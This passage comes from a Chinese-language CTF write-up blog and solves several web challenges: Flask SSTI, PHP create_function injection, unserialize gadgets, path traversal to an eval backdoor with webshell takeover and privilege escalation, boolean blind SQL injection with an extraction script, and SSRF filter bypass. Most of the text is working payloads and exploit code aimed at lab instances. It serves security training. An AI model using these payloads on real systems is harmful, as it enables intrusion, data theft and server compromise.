src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202192515347.png" alt="image-20241202192515347"></p><p>回车重新运行后alert出flag</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202192532428.png" alt="image-20241202192532428"></p><h2 id="NCTF-2018-Flask-PLUS"><a href="#NCTF-2018-Flask-PLUS" class="headerlink" title="[NCTF 2018]Flask PLUS"></a>[NCTF 2018]Flask PLUS</h2><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202195010229.png" alt="image-20241202195010229"></p><p>这题本来想着用fenjing，但是这种格式的好像用不太了fenjing</p><p>Aura给出一个方法：</p><blockquote><p>可以先把黑名单fuzz出来，本地开一个server跑出来payload，再拼上去</p></blockquote><p>虽然但是这道题比较简单直接手动了。</p><p>这里给出payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals__[&#x27;o&#x27;&#x27;s&#x27;][&#x27;pop&#x27;&#x27;en&#x27;](&#x27;tac /Th1s_is__F1114g&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="NISACTF-2022-level-up"><a href="#NISACTF-2022-level-up" class="headerlink" title="[NISACTF 2022]level-up"></a>[NISACTF 2022]level-up</h2><p>一共有五个level，第一关是目录扫描，扫出robots.txt即可。</p><p>第二关md5碰撞，简单</p><p>第三关sha1碰撞，都是有笔记的，简单。</p><p>第四关看看</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;str.php&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$str</span>[<span class="string">&#x27;query&#x27;</span>] == <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;give me a parameter&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ |_|20|5f|2e|\./&#x27;</span>,<span class="variable">$str</span>[<span class="string">&#x27;query&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;blacklist here&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;NI_SA_&#x27;</span>] === <span class="string">&quot;txw4ever&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable">$level5</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;level 4 failed ...&quot;</span>);</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure><p><code>$_SERVER[&#39;REQUEST_URI&#39;]</code> 是一个 PHP 超全局变量，表示当前请求的 URI（Uniform Resource Identifier）。它提供了客户端请求的完整 URI，包括路径和查询字符串部分。</p><blockquote><p><a href="http://example.com/test/page.php?name=John&age=30">http://example.com/test/page.php?name=John&amp;age=30</a></p><p>输出</p><p>&#x2F;test&#x2F;page.php?name&#x3D;John&amp;age&#x3D;30</p></blockquote><p>而下划线用加号绕过即可。</p><p>最后是level5</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//sorry , here is true last level</span></span><br><span class="line"><span class="comment">//^_^</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;str.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>,<span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$b</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就要用到create_function</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">注释掉create_function()格式后面的’&#125;&#x27;,防止报错</span><br><span class="line"></span><br><span class="line">#create_function(‘$a’, ‘echo(“hello”);’)的实现逻辑如下：</span><br><span class="line">function niming($a)</span><br><span class="line">&#123;</span><br><span class="line">echo(“hello”);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">题目里的payload就是下面这个</span><br><span class="line">function niming()</span><br><span class="line">&#123;</span><br><span class="line">&#125;system(‘cat /flag’);//&#125;</span><br></pre></td></tr></table></figure><p>因此这里的payload为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=\create_function&amp;b=&#125;system(&#x27;ls /&#x27;);//</span><br></pre></td></tr></table></figure><p>这里的反斜杠是绕过preg_match，同时转义c，不会对函数造成影响。</p><h2 id="HUBUCTF-2022-新生赛-Calculate"><a href="#HUBUCTF-2022-新生赛-Calculate" class="headerlink" title="[HUBUCTF 2022 新生赛]Calculate"></a>[HUBUCTF 2022 新生赛]Calculate</h2><p>一道计算题，用python解题</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203142059441.png" alt="image-20241203142059441"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://node5.anna.nssctf.cn:26952/&#x27;</span></span><br><span class="line">sess=requests.session()</span><br><span class="line">res=sess.get(url)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    arg=re.findall(<span class="string">&#x27;&lt;div style=&quot;display:inline;color:#.&#123;6&#125;&quot;&gt;(.)&lt;/div&gt;&#x27;</span>,res.text)</span><br><span class="line">    question=<span class="string">&#x27;&#x27;</span>.join(arg)</span><br><span class="line">    <span class="built_in">print</span>(question)</span><br><span class="line">    answer=<span class="built_in">eval</span>(question[:-<span class="number">1</span>])</span><br><span class="line">    <span class="built_in">print</span>(answer)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    res=sess.post(url,data=&#123;<span class="string">&#x27;ans&#x27;</span>:answer&#125;)</span><br><span class="line">    <span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><h2 id="FSCTF-2023-CanCanNeed"><a href="#FSCTF-2023-CanCanNeed" class="headerlink" title="[FSCTF 2023]CanCanNeed"></a>[FSCTF 2023]CanCanNeed</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Noteasy</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$param1</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$param2</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span>=<span class="variable language_">$this</span>-&gt;param1;</span><br><span class="line">        <span class="variable">$b</span>=<span class="variable language_">$this</span>-&gt;param2;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|\.|log|scan|chr|local|sess|b2|id|show|cont|high|reverse|flip|rand|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|y2f/i&#x27;</span>, <span class="variable">$this</span>-&gt;param2)) &#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;this param is error!&#x27;</span>); </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="variable">$a</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$b</span>); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;    </span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Hi!Welcome to FSCTF2023!&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="variable">$file</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]); </span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$file</span>); &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>一眼丁真，create_function</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Noteasy</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$param1</span>=<span class="string">&#x27;create_function&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$param2</span>=<span class="string">&#x27;&#125;system($_POST[jwk]);//&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Noteasy</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>拿捏</p><p>还有一种方法</p><p>直接require也行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Noteasy</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$param1</span>=<span class="string">&#x27;create_function&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$param2</span>=<span class="string">&#x27;&#125;require(base64_decode(ZmlsZTovLy9mbGFn));//&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Noteasy</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><h2 id="湖湘杯-2021-final-Penetratable"><a href="#湖湘杯-2021-final-Penetratable" class="headerlink" title="[湖湘杯 2021 final]Penetratable"></a>[湖湘杯 2021 final]Penetratable</h2><p>有注册登录界面，有root用户，admin用户</p><p>尝试越权改root密码，权限不够，改admin可以，猜测root只有admin可以改，那么接下来就要获得admin权限。这里直接用admin账号登录是改不了的，被禁用了。</p><p>Information界面会将信息回显到界面，那么尝试二次注入</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203150323022.png" alt="image-20241203150323022"></p><p>这里直接修改密码，修改的就是admin用户的密码！</p><p>然后发现按钮不能按，f12看一下就好，自己构造数据包，这里直接看js源码就行了，里面都有</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203151646902.png" alt="image-20241203151646902"></p><p>root密码成功修改成123456，登陆一下看看。</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203151737374.png" alt="image-20241203151737374"></p><p>成功登录，多了一个文件下载的功能点</p><p>抓一下包看看</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203151855387.png" alt="image-20241203151855387" style="zoom:67%;" /><p>看看能不能任意文件下载。</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203152039720.png" alt="image-20241203152039720" style="zoom: 67%;" /><p>目录穿越漏洞~</p><p>之前扫源码扫到过phpinfo.php，那就读取一下试试。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(@<span class="variable">$_GET</span>[<span class="string">&#x27;pass_31d5df001717&#x27;</span>])===<span class="string">&#x27;3fde6bb0541387e4ebdadf7c2ff31123&#x27;</span>)&#123;@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cc&#x27;</span>]);&#125; </span><br><span class="line"><span class="comment">// hint: Checker will not detect the existence of phpinfo.php, please delete the file when fixing the vulnerability.</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203152536667.png" alt="image-20241203152536667"></p><p>正常情况下，我们应该是可以直接拿到&#x2F;flag的内容的，但是这里！！他居然不让我读！权限太低了，那么接下来要做的就是提权！</p><p>先上线哥斯拉！</p><p>这里注意一个问题，他的密码cc是GET类型传参的，这不能被webshell管理工具利用，那么我们cc&#x3D;eval($_POST[1]);然后把1当作密码即可。</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203153252371.png" alt="image-20241203153252371"></p><p>实锤了！</p><p>提权吧接下来<br><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203154849744.png" alt="image-20241203154849744"></p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203155021110.png" alt="image-20241203155021110"></p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203155429796.png" alt="image-20241203155429796"></p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203155415823.png" alt="image-20241203155415823"></p><p>拿捏！</p><h2 id="CISCN-2022-初赛-ezpop"><a href="#CISCN-2022-初赛-ezpop" class="headerlink" title="[CISCN 2022 初赛]ezpop"></a>[CISCN 2022 初赛]ezpop</h2><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203163625594.png" alt="image-20241203163625594"></p><p>用phpggc试了半天结果不行，不知道为啥</p><p>只能自己跟了，跟打0day一样。。。。不过挺好的</p><p>详情看笔记！！！说白了直接用exp就行</p><h2 id="NSSCTF-2022-Spring-Recruit-babysql"><a href="#NSSCTF-2022-Spring-Recruit-babysql" class="headerlink" title="[NSSCTF 2022 Spring Recruit]babysql"></a>[NSSCTF 2022 Spring Recruit]babysql</h2><p>一道布尔盲注，这里给出payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">tarnish&#x27;&amp;&amp;(ascii(substr((select/**/database()),&#123;&#125;,1))&gt;&#123;&#125;)&amp;&amp;/**/&#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line">tarnish&#x27;&amp;&amp;(ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;)&amp;&amp;/**/&#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line">tarnish&#x27;&amp;&amp;(ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_table=&#x27;flag&#x27;),&#123;&#125;,1))&gt;&#123;&#125;)&amp;&amp;/**/&#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line">tarnish&#x27;&amp;&amp;(ascii(substr((select/**/flag/**/from/**/flag),&#123;&#125;,1))&gt;&#123;&#125;)&amp;&amp;/**/&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://node5.anna.nssctf.cn:28905/&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    <span class="built_in">max</span> = <span class="number">127</span></span><br><span class="line">    <span class="built_in">min</span> = <span class="number">32</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">min</span>&lt;<span class="built_in">max</span>:</span><br><span class="line">        mid = (<span class="built_in">max</span>+<span class="built_in">min</span>)//<span class="number">2</span></span><br><span class="line">        payload = <span class="string">&quot;tarnish&#x27;&amp;&amp;(ascii(substr((select/**/group_concat(flag)/**/from/**/flag),&#123;&#125;,1))&gt;&#123;&#125;)&amp;&amp;/**/&#x27;1&#x27;=&#x27;1&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>:payload</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url= url,data=data)</span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="built_in">min</span>=mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">max</span>=mid</span><br><span class="line">    flag+=<span class="built_in">chr</span>(<span class="built_in">min</span>)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;700253f7-9510-4244-a934-a68ed47bbff4&#125;</span><br></pre></td></tr></table></figure><h2 id="HDCTF-2023-YamiYami"><a href="#HDCTF-2023-YamiYami" class="headerlink" title="[HDCTF 2023]YamiYami"></a>[HDCTF 2023]YamiYami</h2><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241204183506892.png" alt="image-20241204183506892"></p><p>打开发现有三个功能点，第一个是ssrf一样的存在，第二个是上传文件，第三个是pwd</p><p>先测一下第一个</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241204183619864.png" alt="image-20241204183619864"></p><p>ok那读一下源码嘛！</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241204183641915.png" alt="image-20241204183641915"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.*</span><br></pre></td></tr></table></figure><p>被过滤了！！！二次url编码来绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28466/read?url=file:///%2561pp/%2561pp.py</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re, random, uuid</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> yaml <span class="comment">#问题所在 pyyaml反序列化</span></span><br><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random() * <span class="number">233</span>)</span><br><span class="line">app.debug = <span class="literal">False</span></span><br><span class="line">BLACK_LIST = [<span class="string">&quot;yaml&quot;</span>, <span class="string">&quot;YAML&quot;</span>, <span class="string">&quot;YML&quot;</span>, <span class="string">&quot;yml&quot;</span>, <span class="string">&quot;yamiyami&quot;</span>]</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="string">&quot;/app/uploads&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session[<span class="string">&#x27;passport&#x27;</span>] = <span class="string">&#x27;YamiYami&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Welcome to HDCTF2023 &lt;a href=&quot;/read?url=https://baidu.com&quot;&gt;Read somethings&lt;/a&gt;</span></span><br><span class="line"><span class="string">    &lt;br&gt;</span></span><br><span class="line"><span class="string">    Here is the challenge &lt;a href=&quot;/upload&quot;&gt;Upload file&lt;/a&gt;</span></span><br><span class="line"><span class="string">    &lt;br&gt;</span></span><br><span class="line"><span class="string">    Enjoy it &lt;a href=&quot;/pwd&quot;&gt;pwd&lt;/a&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/pwd&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwd</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(pwdpath)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/read&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">        m = re.findall(<span class="string">&#x27;app.*&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        n = re.findall(<span class="string">&#x27;flag&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        <span class="keyword">if</span> m:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;re.findall(&#x27;app.*&#x27;, url, re.IGNORECASE)&quot;</span></span><br><span class="line">        <span class="keyword">if</span> n:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;re.findall(&#x27;flag&#x27;, url, re.IGNORECASE)&quot;</span></span><br><span class="line">        res = urlopen(url)</span><br><span class="line">        <span class="keyword">return</span> res.read()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(ex))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;no response&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allowed_file</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">for</span> blackstr <span class="keyword">in</span> BLACK_LIST:</span><br><span class="line">        <span class="keyword">if</span> blackstr <span class="keyword">in</span> filename:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title 